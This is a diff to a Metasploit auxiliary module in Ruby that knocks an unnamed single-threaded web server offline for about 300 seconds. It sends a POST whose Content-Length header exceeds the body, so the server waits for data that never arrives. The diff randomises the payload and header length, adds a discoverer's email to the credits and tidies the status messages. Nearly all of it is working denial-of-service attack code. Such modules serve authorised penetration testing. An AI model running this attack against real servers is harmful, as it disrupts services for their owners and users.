@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Author'         =>
       [
-        'z00n', # vulnerability disclosure
+        'z00n <0xz00n@gmail.com>', # vulnerability disclosure
         'h00die' # metasploit module
       ],
       'References'     => [
@@ -43,11 +43,13 @@ class MetasploitModule < Msf::Auxiliary
     begin
       time = Time.new
       print_status("Sending malformed POST request at #{time.strftime("%Y-%m-%d %H:%M:%S")}.  Server will recover about #{(time + 300).strftime("%Y-%m-%d %H:%M:%S")}")
-      # This request will set DoS the server for ~300 seconds
+      # The web server is single threaded, and when the content length is longer than the data, it will continue to wait
+      # for the rest of the data, which never comes, and times out after ~300 seconds.
+      data = Rex::Text.rand_text_alphanumeric(40)
       send_request_cgi({
         'method'	=>	'POST',
         'uri'		=>	'/',
-        'data'		=>	'asdasdasdasdasdasdasd',
+        'data'		=>	data, #'asdasdasdasdasdasdasd',
         'headers'       => {
           # These are kept here since they were in the original exploit, however they are not required
           #'Host' => 'asdasdasd',
@@ -58,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
           #'Connection' => 'close',
           #'Upgrade-Insecure-Requests' => 1,
           #'Content-Type' => 'application/x-www-form-urlencoded',
-          'Content-Length' => 42
+          'Content-Length' => data.length + rand(10) + 10 #42
         }
       })
 
@@ -69,9 +71,9 @@ class MetasploitModule < Msf::Auxiliary
 
     # Check to see if it worked or not
     if is_alive?
-      print_error("#{rhost}:#{rport} - Server is still alive")
+      print_error("#{peer} - Server is still alive")
     else
-      print_good("#{rhost}:#{rport} - Connection Refused: Success!")
+      print_good("#{peer} - Connection Refused: Success!")
     end
 
   end
